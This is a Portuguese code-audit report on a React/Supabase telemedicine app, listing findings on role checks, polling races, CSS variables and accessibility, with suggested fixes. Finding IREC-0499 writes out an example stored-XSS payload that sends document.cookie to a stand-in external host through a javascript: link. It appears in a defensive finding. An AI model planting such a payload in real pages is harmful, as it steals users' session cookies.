<details><summary>Verificação feita contra o código</summary>

supabaseService.js:1587-1620 confirma: retorna false quando doctorId/patientId sao falsy e, em qualquer erro do Supabase, grava em localStorage e retorna true — nunca lanca. NursesNetwork.jsx:494-504 (e SpecialistDirectory.jsx equivalente) descarta o retorno e navega como sucesso; o catch e de fato praticamente inalcancavel. Severidade rebaixada de alto para medio: o caminho de retorno false exige currentUser.id ausente (raro), e o caso comum de erro de rede ainda persiste o vinculo localmente — o dano real e a divergencia silenciosa entre servidor e cliente, nao a perda imediata.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0316 · MÉDIO · `CONFIRMADO`

**Redirecionamento para telemedicina não abre a conversa: contatos só atualizam a cada 30 s**

**Onde:** `src/components/NursesNetwork.jsx:499`

**O defeito:** Após followPatient, o componente define telemedicineContactId e muda a aba para 'telemedicine'. O Telemedicine está sempre montado (App.jsx:1603-1613) e carrega seus contatos via getAssignedDoctors em um efeito com polling de 30 s (Telemedicine.jsx:226); a seleção do contato-alvo só ocorre quando contacts já contém o id (Telemedicine.jsx:257-258). Não existe nenhum gatilho de refresh exposto aos diretórios (contactsTrigger é interno), então o vínculo recém-criado não está na lista no momento do redirecionamento.

**Como falha:** Paciente clica em 'Iniciar Acompanhamento Clínico' no perfil de um médico/enfermeiro. Cai na tela de mensagens com a lista de contatos sem o profissional e nenhuma conversa aberta (em mobile, permanece na lista). Fica assim por até 30 segundos, parecendo que o vínculo não foi criado; muitos usuários voltam e repetem o clique.

**Código atual:**

```jsx
NursesNetwork.jsx:497-500
                        setRefreshTrigger(prev => prev + 1);
                        setSelectedNurse(null);
                        setTelemedicineContactId(doc.id);
                        setActiveTab('telemedicine');
Telemedicine.jsx:226-228
    const interval = setInterval(loadContacts, 30000);
    return () => clearInterval(interval);
  }, [currentUser, contactsTrigger]);
Telemedicine.jsx:257-258
    if (targetContactId && contacts.length > 0) {
      const match = contacts.find(c => c.id.toString() === targetContactId.toString());
```

**Correção sugerida:** Expor um gatilho de refresh de contatos (ou recarregar contacts quando targetContactId muda e não é encontrado) antes de trocar para a aba 'telemedicine'.

<details><summary>Verificação feita contra o código</summary>

Confirmado e ate pior que o descrito: Telemedicine.jsx:228 depende de [currentUser, contactsTrigger] e o grep mostra que contactsTrigger so aparece na declaracao (linha 200) e na lista de dependencias — nunca e incrementado. Logo, apos followPatient a unica atualizacao possivel e o setInterval de 30s (linha 226), e a selecao do contato-alvo (linhas 256-266) so ocorre quando o id ja esta em contacts. O paciente cai na tela de mensagens sem a conversa aberta por ate 30 segundos.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0354 · MÉDIO · `CONFIRMAR-SCHEMA`

**Diretórios sem checagem de papel: clínico consegue se vincular como 'paciente' de outro clínico**

**Onde:** `src/components/SpecialistDirectory.jsx:501`

**O defeito:** Os cases 'doctors_directory' e 'nurses' do switch de App.jsx não verificam currentUser.role, e a aba inicial vem do hash da URL / de irec_active_tab. O botão chama followPatient(doc.id, currentUser.id) sem validar que currentUser é paciente, criando uma linha em doctor_patient_assignment com um médico/enfermeiro no campo patient_id. Nada no fluxo impede isso, e getAssignedPatients passa a listar esse clínico como paciente do outro profissional.

**Como falha:** Um enfermeiro logado navega para #doctors_directory (ou tem a aba restaurada de localStorage), abre o perfil de um angiologista e clica em 'Iniciar Acompanhamento Clínico'. Ele passa a constar como PACIENTE na lista de pacientes do angiologista, que ganha acesso à área clínica desse registro, e as métricas de pacientes atendidos ficam infladas com um profissional.

**Código atual:**

```jsx
SpecialistDirectory.jsx:499-501
                    onClick={async () => {
                      try {
                        await followPatient(doc.id, currentUser.id);
App.jsx:822-829 (case 'doctors_directory' sem qualquer verificação de currentUser.role)
App.jsx:839-847 (case 'nurses' idem)
```

**Correção sugerida:** Bloquear a ação para currentUser.role !== 'patient' (ocultar o botão e validar dentro de followPatient) e restringir os cases de diretório ao papel paciente.

<details><summary>Verificação feita contra o código</summary>

Verificado em App.jsx:822-829 (doctors_directory) e 839-847 (nurses): nenhum dos cases checa currentUser.role, e a aba inicial vem do hash (App.jsx:37-43) ou de irec_active_tab (App.jsx:466-469). O botao chama followPatient(doc.id, currentUser.id) sem validacao de papel, e o FK patient_id aponta para clinical_profile — que armazena tambem medicos/enfermeiros —, entao o insert e aceito. Sem RLS, nada no banco impede.

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0497 · BAIXO · `CONFIRMADO`

**Variáveis CSS --primary-rgb e --accent-rgb não existem: fundos e bordas não são aplicados**

**Onde:** `src/components/DoctorPartners.jsx:153`

**O defeito:** O componente usa rgba(var(--primary-rgb), 0.15) e rgba(var(--accent-rgb), 0.1) em 8 pontos (153, 154, 163, 164, 257, 261, 307, 314). Nenhuma dessas variáveis é definida em src/index.css (só existem --primary, --primary-light, --primary-glow, --accent, --danger etc.), portanto o valor rgba() resulta inválido e cada declaração é descartada pelo navegador nos dois temas: os ícones ficam sem círculo de fundo, os cards sem a borda de cor e os selos 'GERAL'/'INSUMO' sem realce.

**Como falha:** Qualquer médico que abra 'Minhas Parcerias' vê os selos 'GERAL' e 'INSUMO' como texto colorido solto, sem a pílula de fundo, e os ícones 🏪/📦 sem o quadrado de destaque — tanto no tema claro quanto no escuro. Nada indica erro; o layout apenas não corresponde ao restante do sistema.

**Código atual:**

```jsx
DoctorPartners.jsx:153
        <div className="glass-card" style={{ ... borderColor: 'rgba(var(--primary-rgb), 0.15)' }}>
DoctorPartners.jsx:261
                    <span style={{ ... backgroundColor: 'rgba(var(--primary-rgb), 0.1)', color: 'var(--primary)' }}>GERAL</span>
src/index.css:19-30 — define --primary-light, --primary-glow, --accent, --danger; NÃO define --primary-rgb nem --accent-rgb (grep em todo src/*.css não retorna ocorrência)
```

**Correção sugerida:** Definir --primary-rgb/--accent-rgb em :root (e no tema escuro) ou substituir por color-mix(in srgb, var(--primary) 15%, transparent).

<details><summary>Verificação feita contra o código</summary>

Os usos existem nas linhas 153, 154, 163, 164, 257, 261, 307 e 314. Grep em todo o repositorio nao encontra nenhuma definicao de --primary-rgb/--accent-rgb (nem em CSS nem via setProperty em JS), portanto rgba(var(--primary-rgb), 0.15) e um valor invalido e a declaracao inteira e descartada pelo navegador — bordas, fundos de icone e pilulas 'GERAL'/'INSUMO' ficam sem estilo nos dois temas.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0498 · BAIXO · `CONFIRMADO`

**Chaves de estilo inválidas ('justifyContext' e 'hover') geram avisos e efeito que nunca acontece**

**Onde:** `src/components/DoctorPartners.jsx:154`

**O defeito:** Nos dois cards de estatística há a propriedade inexistente justifyContext: 'center' (linhas 154 e 164) e, no card de farmácia, a chave hover: { transform: 'translateY(-2px)' } dentro do objeto style (linha 257). React não aceita pseudo-classes em style inline: o objeto é passado ao DOM, gera 'Unsupported style property' no console em cada render e o efeito de elevação ao passar o mouse — declarado junto de transition: 'transform 0.2s' — nunca ocorre.

**Como falha:** Ao abrir 'Minhas Parcerias', o console enche de avisos React de propriedade de estilo não suportada, e passar o mouse sobre os cartões de farmácia parceira não produz nenhuma animação, ao contrário dos demais cartões do sistema que usam onMouseEnter.

**Código atual:**

```jsx
DoctorPartners.jsx:154
          <div style={{ width: '48px', height: '48px', borderRadius: '12px', backgroundColor: 'rgba(var(--primary-rgb), 0.1)', display: 'flex', alignItems: 'center', justifyContext: 'center', fontSize: '22px', justifyContent: 'center' }}>
DoctorPartners.jsx:257
              <div key={item.id} className="glass-card" style={{ ... transition: 'transform 0.2s', hover: { transform: 'translateY(-2px)' } }}>
```

**Correção sugerida:** Remover as chaves justifyContext e hover, e implementar a elevação com onMouseEnter/onMouseLeave como nos demais cards.

<details><summary>Verificação feita contra o código</summary>

Confirmado literalmente: justifyContext: 'center' nas linhas 154 e 164 (ao lado de um justifyContent correto no mesmo objeto, o que torna o efeito visual nulo) e hover: { transform: 'translateY(-2px)' } dentro do style inline na linha 257, junto de transition: 'transform 0.2s'. React nao suporta pseudo-classes em style inline, entao o efeito de elevacao nunca ocorre e ha aviso de propriedade nao suportada em dev.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0499 · BAIXO · `VERIFICAR`

**Link de afiliado informado pelo usuário vai direto para href, permitindo esquema javascript:**

**Onde:** `src/components/DoctorPartners.jsx:264`

**O defeito:** affiliate_link é texto livre gravado pelo profissional e renderizado sem sanitização em href (linhas 264 e 319). O input type="url" não bloqueia esquemas perigosos (javascript:alert(1) é uma URL absoluta válida para o parser), e o mesmo campo é exibido aos PACIENTES nos protocolos (ProtocolGuide.jsx:332-336 usa os itens type 'doctor_general_partner'). O rel="noopener noreferrer" está correto, mas não protege contra o esquema do link.

**Como falha:** Um usuário com acesso à tela (inclusive um paciente que chegou por #doctor-partners, ver achado de papel) cadastra uma 'farmácia parceira' cujo link é javascript:fetch('https://ext/?c='+document.cookie). Qualquer paciente do médico vinculado que toque nesse atalho de compra no guia de protocolos executa o script no contexto da aplicação autenticada.

**Código atual:**

```jsx
DoctorPartners.jsx:263-265
                  <p style={{ ... }}>
                    🔗 Link: <a href={item.affiliate_link} target="_blank" rel="noopener noreferrer" style={{ color: 'var(--primary)', textDecoration: 'none' }}>{item.affiliate_link}</a>
                  </p>
DoctorPartners.jsx:376-384 — input type="url" sem validação de esquema
```

**Correção sugerida:** Validar o esquema antes de salvar e ao renderizar (aceitar apenas http:/https:, ex.: `const safe = /^https?:\/\//i.test(item.affiliate_link) ? item.affiliate_link : '#';`).

<details><summary>Verificação feita contra o código</summary>

Confirmei que affiliate_link e texto livre renderizado sem sanitizacao em href nas linhas 264 e 319, que rel="noopener noreferrer" nao protege contra esquema, e que o input type="url" aceita javascript:... como URL absoluta valida. Nao consegui confirmar, sem executar, se o React 19 apenas emite aviso ou de fato bloqueia URLs javascript: em href — historicamente e aviso de depreciacao, o que tornaria a execucao possivel. Mantido em baixo porque quem cadastra ja precisa estar autenticado e o alcance a pacientes depende do caminho de ProtocolGuide.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0518 · BAIXO · `CONFIRMADO`

**Polling de 10s sem cancelamento cria corrida que desfaz o vínculo recém-criado na UI**

**Onde:** `src/components/NursesNetwork.jsx:104`

**O defeito:** Um setInterval de 10s incrementa refreshTrigger, disparando loadData. loadData não tem flag de cancelamento nem AbortController, e dois ciclos podem se sobrepor: se a resposta de um poll iniciado ANTES do followPatient chegar DEPOIS, setAssignedNurses sobrescreve a lista atualizada com a versão antiga. Também há setState após desmontagem quando o usuário troca de aba durante um fetch em voo.

**Como falha:** Paciente clica em 'Iniciar Acompanhamento Clínico'; o vínculo é criado e refreshTrigger dispara um reload. Uma requisição de polling disparada 200 ms antes do clique chega depois e devolve a lista sem o vínculo. O drawer/cartão volta a mostrar 'Iniciar Acompanhamento Clínico'; ao clicar de novo, é feita uma segunda tentativa de insert do mesmo par doctor_id/patient_id em doctor_patient_assignment.

**Código atual:**

```jsx
NursesNetwork.jsx:103-109
  useEffect(() => {
    const interval = setInterval(() => {
      console.log("[iRec] Polling nurses network list in background...");
      setRefreshTrigger(prev => prev + 1);
    }, 10000);
    return () => clearInterval(interval);
  }, []);
NursesNetwork.jsx:86-99 — loadData() sem guarda de cancelamento (setAllNurses/setAssignedNurses sempre aplicados)
```

**Correção sugerida:** Adicionar flag de cancelamento no efeito (`let cancelled = false; ... if (!cancelled) setAllNurses(...); return () => { cancelled = true; }`).

<details><summary>Verificação feita contra o código</summary>

O intervalo de 10s (linhas 103-109) e o loadData sem flag de cancelamento (linhas 85-100) existem como descrito, e setAllNurses/setAssignedNurses sao aplicados incondicionalmente — a corrida de resposta fora de ordem e real. Severidade rebaixada de medio para baixo: a janela e estreita, o estado se autocorrige no proximo ciclo de 10s e a reinsercao duplicada e absorvida (erro 23505 tratado em supabaseService.js:1606 e dedup por 'exists' no modo local), alem de o React 19 nao mais avisar sobre setState pos-desmontagem.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0519 · BAIXO · `CONFIRMAR-SCHEMA`

**Seletor de especialidade sem rótulo acessível**

**Onde:** `src/components/NursesNetwork.jsx:157`

**O defeito:** O <select> de filtro não possui <label>, aria-label nem opção-cabeçalho descritiva: a primeira opção é 'Todas as Especialidades'. Leitores de tela anunciam apenas o valor atual, sem dizer o que o controle filtra. O <input> de busca ao lado também depende exclusivamente do placeholder. Mesmo padrão em SpecialistDirectory.jsx:160.

**Como falha:** Paciente com leitor de tela chega ao diretório e ouve apenas 'Todas as Especialidades, caixa de combinação'; não há como saber que o controle filtra a lista de enfermeiros nem que existe um campo de busca por nome ao lado, cujo texto de placeholder desaparece ao digitar.

**Código atual:**

```jsx
NursesNetwork.jsx:157-171
        <select
          value={filterSpecialty}
          onChange={e => setFilterSpecialty(e.target.value)}
          style={{ ... }}
        >
          <option value="all">Todas as Especialidades</option>
```

**Correção sugerida:** Adicionar aria-label="Filtrar por especialidade" ao select e aria-label="Buscar profissional por nome" ao input.

<details><summary>Verificação feita contra o código</summary>

NursesNetwork.jsx:157-175 e SpecialistDirectory.jsx:160-180: o <select> nao tem <label>, aria-label nem option-cabecalho descritiva (a primeira opcao e 'Todas as Especialidades'), e o <input> de busca (linhas 139-156) so tem placeholder, sem label nem aria-label. Leitores de tela anunciam apenas o valor atual.

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0520 · BAIXO · `CONFIRMADO`

**Profissional sem nome cadastrado nunca aparece no diretório**

**Onde:** `src/components/NursesNetwork.jsx:183`

**O defeito:** matchesSearch usa optional chaining na cadeia inteira: doc.name?.toLowerCase().includes(...). Quando name é null/undefined (getAllNurses mapeia name: item.name sem fallback, supabaseService.js:1277), a expressão resulta em undefined e o profissional é filtrado fora mesmo com a busca vazia — em vez de aparecer. O mesmo em SpecialistDirectory.jsx:188. O filtro do estado vazio repete a expressão, então o profissional simplesmente desaparece sem qualquer aviso.

**Como falha:** Enfermeiro verificado cadastrado via importação/administração com a coluna name nula não é listado para nenhum paciente, mesmo sem filtros aplicados, e nenhum log ou mensagem indica a omissão. Ele fica invisível na plataforma indefinidamente.

**Código atual:**

```jsx
NursesNetwork.jsx:182-186
          .filter(doc => {
            const matchesSearch = doc.name?.toLowerCase().includes(searchQuery.toLowerCase());
            const matchesSpecialty = filterSpecialty === 'all' || doc.specialty?.toLowerCase().includes(filterSpecialty.toLowerCase());
            return matchesSearch && matchesSpecialty;
          })
```

**Correção sugerida:** Usar `const matchesSearch = !searchQuery || (doc.name || '').toLowerCase().includes(searchQuery.toLowerCase());`.

<details><summary>Verificação feita contra o código</summary>

NursesNetwork.jsx:183 e SpecialistDirectory.jsx:188 usam doc.name?.toLowerCase().includes(...) — com name null a expressao inteira vira undefined (falsy) e o registro e excluido mesmo com busca vazia, em vez de incluido. getAllNurses mapeia name: item.name sem fallback (supabaseService.js:1277), diferente dos demais campos que usam || ''. O filtro do estado vazio repete a expressao, entao a omissao e totalmente silenciosa. Depende de name nulo no banco, mas o defeito de logica e deterministico.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0521 · BAIXO · `CONFIRMADO`

**isAlreadyAssigned calculado no cartão e nunca usado: paciente não vê que já está vinculado**

**Onde:** `src/components/NursesNetwork.jsx:188`

**O defeito:** Dentro do map dos cartões, isAlreadyAssigned é calculado a cada render e nunca referenciado no JSX do cartão (só a variável homônima do drawer, linha 318, é usada). O cartão fica sem qualquer indicação de vínculo existente e sempre mostra a mesma ação. Mesmo código morto em SpecialistDirectory.jsx:193.

**Como falha:** Paciente que já iniciou acompanhamento com uma enfermeira volta ao diretório e vê o cartão dela exatamente igual ao dos profissionais não vinculados, sem selo de 'Já acompanha'; precisa abrir o drawer para descobrir, pela troca do botão para '💬 Enviar Mensagem no Chat', que o vínculo já existe.

**Código atual:**

```jsx
NursesNetwork.jsx:187-189
          .map(doc => {
            const isAlreadyAssigned = assignedNurses.some(c => c.id === doc.id);
            const docInitials = doc.name ? ... ;
(nenhuma referência a isAlreadyAssigned entre as linhas 191 e 302)
```

**Correção sugerida:** Usar a variável para renderizar um selo 'Já acompanha' no cartão (ou removê-la se a indicação não for desejada).

<details><summary>Verificação feita contra o código</summary>

Grep confirma apenas 3 ocorrencias em NursesNetwork.jsx (188 declaracao no map do cartao, 318 declaracao no drawer, 478 unico uso — dentro do drawer) e o padrao identico em SpecialistDirectory.jsx (193, 323, 483). A variavel da linha 188 e codigo morto e o cartao realmente nao sinaliza vinculo existente; o paciente so descobre ao abrir o drawer. Impacto de UX menor, sem risco funcional.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0522 · BAIXO · `CONFIRMADO`

**Cartões de profissionais também são <div> clicáveis sem semântica de botão**

**Onde:** `src/components/NursesNetwork.jsx:192`

**O defeito:** O cartão de cada enfermeiro abre o drawer de perfil clínico via onClick em <div>, sem role, tabIndex ou handler de teclado; o único texto que sugere a ação ('Ver Perfil Clínico →') é um <span> não focável. Idêntico em SpecialistDirectory.jsx:197-199. Usuários de teclado alcançam apenas o botão 'AGENDAR VISITA / CURATIVO' interno, ou seja, conseguem contratar mas não conseguem abrir o perfil com formação, valor e depoimentos antes de contratar.

**Como falha:** Usuário de teclado percorre o diretório com Tab: o foco pula direto de um botão 'AGENDAR VISITA / CURATIVO' para o do próximo cartão. Não há como abrir o 'Perfil do Enfermeiro' para conferir formação e valor antes de iniciar o agendamento.

**Código atual:**

```jsx
NursesNetwork.jsx:191-195
              <div 
                key={doc.id} 
                onClick={() => setSelectedNurse(doc)}
                className="glass-card" 
                style={{ ... cursor: 'pointer',
NursesNetwork.jsx:296-298
                    <span style={{ color: 'var(--primary)', ... }}>
                      Ver Perfil Clínico →
```

**Correção sugerida:** Tornar 'Ver Perfil Clínico' um <button> real que abre o drawer, mantendo o clique no card como atalho redundante.

<details><summary>Verificação feita contra o código</summary>

NursesNetwork.jsx:191-208 e SpecialistDirectory.jsx:196-209 sao <div> com onClick e cursor:pointer, sem role/tabIndex/onKeyDown; o texto 'Ver Perfil Clinico →' e um <span> (linhas 296-298) nao focavel. O unico controle focavel dentro do cartao e o botao de agendamento (linhas 268-292), confirmando que o usuario de teclado consegue contratar mas nao abrir o perfil.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0523 · BAIXO · `CONFIRMADO`

**Drawer de perfil clínico não fecha com Esc nem com clique no fundo e não é um dialog acessível**

**Onde:** `src/components/NursesNetwork.jsx:322`

**O defeito:** O overlay position:fixed com z-index 1000 não tem onClick para fechar, não há listener de keydown para Escape, não há role="dialog"/aria-modal nem trap/retorno de foco, e o scroll do body não é bloqueado. A única forma de sair é acertar o '×' no topo. Mesmo defeito em SpecialistDirectory.jsx:327-340. O overlay cobre toda a viewport, inclusive a navegação inferior mobile, bloqueando qualquer outro clique.

**Como falha:** Paciente em celular abre o perfil de um enfermeiro e tenta fechar tocando na área escurecida (padrão do sistema) ou pressionando 'voltar'/Esc no teclado: nada acontece e a navegação inferior está coberta pelo overlay. Ele fica preso na modal até localizar o '×' de 24px no canto.

**Código atual:**

```jsx
NursesNetwork.jsx:322-335
          <div style={{
            position: 'fixed',
            top: 0, left: 0, right: 0, bottom: 0,
            backgroundColor: 'rgba(15, 23, 42, 0.45)',
            backdropFilter: 'blur(8px)',
            zIndex: 1000,
            ...
          }}>   // nenhum onClick / onKeyDown
```

**Correção sugerida:** Fechar no clique do backdrop (onClick com checagem de e.target === e.currentTarget) e adicionar listener de Escape + role="dialog" aria-modal="true".

<details><summary>Verificação feita contra o código</summary>

NursesNetwork.jsx:322-335 e SpecialistDirectory.jsx:327-340: overlay position:fixed cobrindo a viewport com zIndex 1000, sem onClick de fechamento, sem role="dialog"/aria-modal, sem listener de Escape e sem trap de foco; o unico controle de saida e o botao '×' (linhas 352-365). Nao ha bloqueio de scroll do body. Todos os pontos da descricao conferem.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0540 · BAIXO · `CONFIRMADO`

**Campo 'CRM:' renderizado vazio quando o registro não está preenchido**

**Onde:** `src/components/SpecialistDirectory.jsx:300`

**O defeito:** Diferente do diretório de enfermagem (que usa doc.crm || 'Dispensado'), aqui doc.crm é interpolado sem fallback no cartão e no drawer. getAllDoctors mapeia crm: item.crm || '' (supabaseService.js:1328), então um médico sem CRM preenchido gera o texto truncado 'CRM: ' e 'CRM:  • RQE: Dispensado', sugerindo dado corrompido em um campo regulatório crítico.

**Como falha:** Médico verificado manualmente pelo admin sem o campo crm preenchido: o paciente vê no rodapé do cartão 'CRM: ' (rótulo solto sem número) e, no perfil, 'CRM:  • RQE: Dispensado', logo abaixo do banner que afirma 'Registro profissional ativo no Conselho'.

**Código atual:**

```jsx
SpecialistDirectory.jsx:299-300
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '10.5px', color: 'var(--text-muted)' }}>
                    <span>CRM: {doc.crm}</span>
SpecialistDirectory.jsx:398-400
                      CRM: {doc.crm} • RQE: {doc.rqe || 'Dispensado'}
```

**Correção sugerida:** Aplicar fallback: `CRM: {doc.crm || 'Não informado'}` no cartão e no drawer.

<details><summary>Verificação feita contra o código</summary>

SpecialistDirectory.jsx:300 interpola {doc.crm} sem fallback, enquanto NursesNetwork.jsx:295/394 usa doc.crm || 'Dispensado'. getAllDoctors mapeia crm: item.crm || '' (supabaseService.js:1328), entao o resultado com CRM vazio e o rotulo solto 'CRM: '. Divergencia real entre os dois diretorios; impacto puramente cosmetico/de confianca.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## Verificação do módulo

Rode ao terminar todos os itens acima:

```bash
npx eslint . 2>&1 | grep -E "DoctorPartners.jsx|MyNetworkPortal.jsx|NursesNetwork.jsx|SpecialistDirectory.jsx"
```

```bash
npx vite build
```

O build precisa passar. O ESLint não pode ter ganho erro novo nestes arquivos.
